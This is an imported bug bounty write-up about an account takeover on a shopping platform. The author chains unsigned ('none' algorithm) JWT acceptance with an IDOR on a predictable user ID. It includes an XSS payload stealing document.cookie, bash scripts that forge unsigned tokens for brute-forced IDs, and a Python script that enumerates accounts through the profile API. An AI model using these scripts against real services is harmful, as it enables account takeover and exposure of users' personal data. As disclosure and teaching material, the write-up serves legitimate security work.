---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-06_how-i-was-able-to-get-account-takeover-via-idor-form-jwt.md
original_filename: 2023-06-06_how-i-was-able-to-get-account-takeover-via-idor-form-jwt.md
title: How I was able to get account takeover via IDOR form JWT
category: documents
detected_topics:
- jwt
- access-control
- idor
- xss
- command-injection
- otp
tags:
- imported
- documents
- jwt
- access-control
- idor
- xss
- command-injection
- otp
language: en
raw_sha256: 2ab3b5aeae9f25a67c7ffbd3ffdd990581141d5e41990c8f3926fb39b84c82c4
text_sha256: 04c8164b6296aec632f995a204864929a21657e3c616648e8a664330188cbb4a
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: true
---

# How I was able to get account takeover via IDOR form JWT

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-06_how-i-was-able-to-get-account-takeover-via-idor-form-jwt.md
- Source Type: markdown
- Detected Topics: jwt, access-control, idor, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: True
- Raw SHA256: `2ab3b5aeae9f25a67c7ffbd3ffdd990581141d5e41990c8f3926fb39b84c82c4`
- Text SHA256: `04c8164b6296aec632f995a204864929a21657e3c616648e8a664330188cbb4a`


## Content

---
title: "How I was able to get account takeover via IDOR form JWT"
url: "https://medium.com/@M0X0101/how-i-was-able-to-get-account-takeover-via-idor-form-jwt-caaf7ea58aa"
authors: ["Mohamed Reda (@M0x0101)"]
bugs: ["JWT", "IDOR", "Bruteforce", "Self-XSS", "Account takeover"]
publication_date: "2023-06-06"
added_date: "2023-06-06"
source: "pentester.land/writeups.json"
original_index: 1075
scraped_via: "browseros"
---

# How I was able to get account takeover via IDOR form JWT

Mohamed reda
 highlighted

Mohamed reda
 highlighted

Mohamed reda
 highlighted

Top highlight

1

How I was able to get account takeover via IDOR form JWT
Mohamed reda
Follow
8 min read
·
Jun 6, 2023

2.3K

32

Press enter or click to view image in full size

Hello guys, today I’m gonna explain how I got IDOR and exploit it to make account takeover.

I have tweeted the entire write-up as a Twitter thread. If you are interested, please follow me on Twitter to receive updates more quickly.

I started hunting for vulnerabilities on the BBP at bugbounter platform. Let’s say the platform name was “redirect.com”. After reviewing the web application, which was using JSON Web Token (JWT), I attempted to get an ATO.

Therefore, I decided to create an account and test all its functions. Initially, I tried to exploit a vulnerability by entering an XSS payload on the ‘firstName’ field and completed the other fields. When I logged in with Firefox browser, nothing happened, and I thought that the platform was safe. However, when I logged in with Microsoft Edge, the XSS payload was alerted.

Press enter or click to view image in full size

At this point, it appeared to be a self XSS vulnerability since users were unable to visit other profiles and all blind XSS attempts were unsuccessful. I was hoping to collaborate with someone to help me convert the self XSS vulnerability into a non-self XSS vulnerability.

After testing all the functions, I returned to Burp Suite to inspect the traffic. I found a specific request…

GET /profile HTTP/2
Host: api.redirect.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: application/json, text/plain, */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
Authorization: Bearer ***REDACTED***
Origin: https://www.redirect.com
Referer: https://www.redirect.com/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Te: trailers

The application utilized JSON Web Tokens (JWT) for authorization. After decoding the JWT, I discovered that

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiQ3VzdG9tZXIiLCJ1c2VySWQiOiI2NDczM2MxMDM3NmFkMTZhODliZWMzOTUiLCJlbWFpbCI6Im1vaGFtZWRAZ21haWwuY29tIiwiZmlyc3ROYW1lIjoibDxzdmcgT25seT0xICBPbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKT4iLCJsYXN0TmFtZSI6Imw8c3ZnIE9ubHk9MSAgT25sb2FkPWFsZXJ0KGRvY3VtZW50LmNvb2tpZ***REDACTED-API-KEY***.ADEzFqcfIQ7uDVXKLBHZStu3LQ9zog2Fd-yDWrYrklc
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "type": "Customer",
  "userId": "64733c10376ad16a89bec395",
  "email": "mohamed@gmail.com",
  "firstName": "l<svg Only=1  Onload=alert(document.cookie)>",
  "lastName": "l<svg Only=1  Onload=alert(document.cookie)>",
  "createTime": "05/30/2023 00:16:50",
  "registerTime": "05/28/2023 11:33:36",
  "hasKey": "true",
  "nbf": 1685405800,
  "exp": 1685492200,
  "iat": 1685405800
}

At first, I attempted all the methods mentioned here

Mohamed Reda on LinkedIn: JWT Attacks
Hello guys, this is our first security report , it&#39;s about JWT Attacks (intro , attacks , Real world scenario and…

www.linkedin.com

At this point, I had exhausted all the methods mentioned earlier, and the None algorithm worked for me. It worked even when I removed the signature.

As a result, I had a None Algorithm vulnerability. I attempted privilege escalation by changing the “type”: “Customer” to “type”: “Admin” or any other privilege-related value, but I was unsuccessful. So, I tried IDOR, and there were two parameters that I could test.”

"userId": "64733c10376ad16a89bec395"
"email": "mohamed@gmail.com"

After attempting several methods with email, I did not find anything useful. So, I attempted to change the user ID, and when I changed it to someone else’s ID, it worked, and I was able to retrieve their information.

Press enter or click to view image in full size
IDOR

At this point, the maximum severity for this bug was considered medium because The ID was not easily accessible from anywhere.

As the website was a shopping platform, I attempted to fuzz the API, but I did not come across any interesting findings. I also tried to search for any data in the comments section or user profiles, but I couldn’t find any as there was no comment option or user profile feature available or review. I even tried to search the Wayback-Machine and JavaScript files, but I was unable to find any useful information.

Let’s analyze the user ID. To begin with, I created several accounts to test on it

number of test accounts

As shown in the ‘number of test accounts’ picture, we can observe a pattern in the user ID as follows:

Press enter or click to view image in full size
analysis id

Based on this analysis, the first 8 bits of the user ID appear to be a hexadecimal representation of the timestamp. The next 12 hex digits are fixed for a certain period of time during the day (which can be determined by creating an account), and the last 4 digits are random.

Explain:

My scenario at this point was to perform a brute force attack using the pattern we have analyzed. Since we have identified the first 8 bits as a timestamp, we can narrow down our brute force search to the remaining 18 bits. However, we can determine the next 12 bits by creating an account and observing the generated user ID.

Therefore, the main point of the brute force attack would be to determine the last 4 digits of the user ID.

To create a proof of concept for this attack, I would need to follow these steps:

Get all possible timestamps for a day.
Determine all possible user IDs at a given timestamp.
Generate a JSON Web Token (JWT) for each user ID.
Use a brute force attack to try all possible combinations of the last 4 digits of the user ID using the JWTs generated in step 3.
Keep track of the valid user IDs that are obtained through the brute force attack.
Analyze the results and determine the number of valid user IDs obtained.

Based on the analysis_id_pic, the timestamp appears to be represented by the hexadecimal value ‘647DDEA2’. The first 4 digits represent the year, month, and day, and the last 4 digits represent the hours, minutes, and seconds.

Get Mohamed reda’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

To generate a file with all possible combinations of the last 4 digits of the timestamp, we can use the following script commands:

#!/bin/bash

for ((i=0;i<=0xffff;i++))
do
  hex=$(printf "%04x" $i)
  echo $hex
done >> hex4.txt

After that we will go to the next step as we will get all possible userid at all times we got from the first step

userid was divided into three parts

646fcff0 ==> timestamp, 5523e47052f1 ==> fixed 12 digits of hex, 310e ==> random 4 digits

To recap our analysis, the first 8 hex digits of the user ID represent the timestamp, the next 12 hex digits are fixed for all users at sometimes during the day, and the last 4 hex digits are randomly generated.

To obtain the first 12 hex digits, we can create an account at the beginning of the day and observe the generated user ID.

To obtain all possible combinations of the last 4 hex digits, we can use a bash script similar to the one used to generate all possible timestamps. This will give us a file with all possible combinations of the last 4 hex digits, which we can then concatenate with the fixed 12 hex digits for each timestamp to obtain all possible user IDs at all times during the day.

#!/bin/bash

for ((i=0;i<=0xffff;i++))
do
  hex=$(printf "%04x" $i)
  echo $hex
done >> hex4.txt

After generating all possible user IDs for each timestamp, we need to convert each user ID into a JWT to check which ones are valid. We can use the following script command to generate a JWT for each user ID:

for i in `cat hex4.txt`; do for j in `cat hex4.txt`; do  echo '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '==' | tr -d '\n';  echo '.' | tr -d '\n' ;  echo '{"limit":2,"type":"Customer","userId":"'$i'5523e47052f150'$j'"}' | base64 | tr -d '==' | tr -d '\n';  echo '.' ;  done ; done >> rahim_allah_alfataa_salah.txt

After generating all possible JWTs for each user ID, we need to check which ones are valid. We can use the following Python code to check the validity of each JWT:

import requests
import time

url = "https://api.redirect.com/profile"
bearer_token_file = "rahim_allah_alfataa_salah.txt"

with open(bearer_token_file, "r") as f:
  jwt_list = f.readlines()

for jwt_str in jwt_list:
  jwt_token = jwt_str.strip()

  headers = {"Authorization": f"Bearer {jwt_token}"}

  response = requests.get(url, headers=headers)

  if response.ok and response.status_code == 200:
  response_data = response.json()
  print("userid: " + response_data["items"]['id'])
Exploit:

After that o reported it to the program the triager made an account and give me this as timestamp 30.05.2023
but it wasn't the all 8 bits of timestamp (just 5 of them) so I made a code to get all possible timestamp from 30.05.2023 at 11 pm to 11,30 pm

Press enter or click to view image in full size
hacking_triager_account_;D

I used this website to get the timestamp.

and this for brute force last 3 digits at timestamp (you can made 4 digits but i made it 3 to decreeing the time) and I named the output with timestamp.txt

#!/bin/bash

start=6475d908
end=6475dFFF

for ((i=0x$start;i<=0x$end;i++))
do
  printf "%x\n" $i
done << timestamp.txt

for the last 4 hex of digits for userid we will run this bash script to get all possible last 4 hex of digits it will be he same as the first script (I will made it to 2 hex of digits to decreeing the time ) and i named the output with jadak_alghaithu.txt

for i in {0..255}; do printf "%02X\n" $i; done >> jadak_alghaithu.txt;

for converting all this timestamp, fixied 12 hex of digits and alst 4 digits to get all JWT I wrote this and i will name it with brute_force.txt

for i in `cat timestamp.txt`; do for j in `cat jadak_alghaithu.txt`; do echo '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '==' | tr -d '\n'; echo '.' | tr -d '\n' ; echo '{"limit":2,"type":"Customer","userId":"'$i'5523e47052f150'$j'"}' | base64 | tr -d '==' | tr -d '\n'; echo '.' ; done ; done >> brute_force.txt

After that i wrote this python code to made the attack
i named it with Hack_hack.py

import requests
import time

url = "https://api.redirect.com/profile"
bearer_token_file = "brute_force.txt"

with open(bearer_token_file, "r") as f:
  jwt_list = f.readlines()

for jwt_str in jwt_list:
  jwt_token = jwt_str.strip()

  headers = {"Authorization": f"Bearer {jwt_token}"}

  response = requests.get(url, headers=headers)

  if response.ok and response.status_code == 200:
  response_data = response.json()
  print("userid: " + response_data["items"]['id'])

And that was the results

Press enter or click to view image in full size

here is the userid :6475d9315523e47052f15098 for the triager

so I sent it to burp

Press enter or click to view image in full size

And this is the data for the triager.

{
  "offset":0,
  "limit":1,
  "items":{
  "id":"6475d9315523e47052f15098",
  "lastLoggedAt":"2023–05–30T11:08:34.219Z",
  "createdAt":"2023–05–30T11:08:33.493Z",
  "dateOfBirth":null,
  "gender":null,
  "registerType":"email",
  "addresses":[
  ],
  "firstName":"test1",
  "lastName":"test2",
  "email":"**************@gmail.com",
  "phone":null,
  "state":"active",
  "registerOrigin":"desktop",
  "marketingAccepted":true,
  "marketingAcceptedAt":"2023–05–30T11:08:33.493Z"
  },
  "size":1,
  "success":true,
  "message":null,
  "statusCode":"ok"
}
Press enter or click to view image in full size

The end

Thank you for reading, and I hope you learned something new! If you have any questions or feedback, please don’t hesitate to DM me on Twitter or LinkedIn.
